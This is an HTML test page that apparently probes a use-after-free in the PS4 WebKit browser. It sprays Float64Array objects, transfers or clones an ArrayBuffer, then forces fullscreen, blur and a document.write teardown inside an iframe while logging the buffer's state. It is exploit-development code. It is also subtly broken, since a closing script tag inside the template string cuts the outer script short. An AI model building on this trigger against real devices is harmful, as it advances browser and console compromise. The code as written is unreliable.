<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit UAF / Float64Array Investigation</title>
<style>
body {
    font-family: monospace;
    background: #000;
    color: #0f0;
}
button {
    font-size: 16px;
    margin: 5px;
}
#log {
    white-space: pre-wrap;
    margin-top: 10px;
}
iframe {
    width: 100%;
    height: 300px;
    border: 1px solid #0f0;
}
</style>
</head>

<body>
<h2>PS4 WebKit – Fullscreen + Blur + Float64Array</h2>

<button onclick="runTest('A')">TEST A – Control</button>
<button onclick="runTest('B')">TEST B – DataView</button>
<button onclick="runTest('C')">TEST C – postMessage transfer</button>
<button onclick="runTest('D')">TEST D – structuredClone</button>

<div id="log"></div>
<iframe id="frame"></iframe>

<script>
function log(msg) {
    document.getElementById("log").textContent += msg + "\n";
}

log("[PARENT] Loaded");

function runTest(mode) {
    document.getElementById("log").textContent = "";
    log("=== START TEST " + mode + " ===");

    const iframe = document.getElementById("frame");

    iframe.onload = () => {
        const doc = iframe.contentDocument;
        doc.open();
        doc.write(makeIframeHTML(mode));
        doc.close();
    };

    iframe.src = "about:blank";
}

function makeIframeHTML(mode) {
return `
<!DOCTYPE html>
<html>
<body style="background:black;color:#0f0;font-family:monospace;">
<pre id="ilog"></pre>
<button id="start">START</button>

<script>
const log = (m) => {
    document.getElementById("ilog").textContent += m + "\\n";
};

let f64 = null;
let buffer = null;
let spray = [];

log("[IFRAME] Loaded");

function snapshot(tag) {
    log("[SNAPSHOT] " + tag);
    try {
        log(" f64.length = " + (f64 ? f64.length : null));
        log(" f64[0] = " + (f64 ? f64[0] : null));
        log(" buffer.byteLength = " + (buffer ? buffer.byteLength : null));
    } catch (e) {
        log(" snapshot exception");
    }
}

document.getElementById("start").onclick = () => {
    log("[START] clicked");

    // === ALLOCATION (CRITICAL PART) ===
    buffer = new ArrayBuffer(64);
    f64 = new Float64Array(buffer);
    f64[0] = 13.37;

    for (let i = 0; i < 500; i++) {
        spray.push(new Float64Array(8));
    }

    log("[ALLOC] Float64Array length=" + f64.length);
    log("[SPRAY] alive=" + spray.length);

    snapshot("before register");

    if ("${mode}" === "B") {
        log("[REGISTER] DataView");
        window.dv = new DataView(buffer);
    }

    if ("${mode}" === "C") {
        log("[REGISTER] postMessage transfer");
        parent.postMessage(buffer, "*", [buffer]);
    }

    if ("${mode}" === "D") {
        log("[REGISTER] structuredClone");
        try {
            structuredClone(f64);
        } catch (e) {
            log(" structuredClone exception");
        }
    }

    snapshot("before fullscreen");

    document.documentElement.webkitRequestFullscreen();

};

document.addEventListener("blur", () => {
    log("[EVENT] blur detected");
    snapshot("after blur");

    log("[TEARDOWN] document.write iframe");
    document.open();
    document.write("<h3>teardown</h3>");
    document.close();
});
</script>
</body>
</html>
`;
}
</script>
</body>
</html>
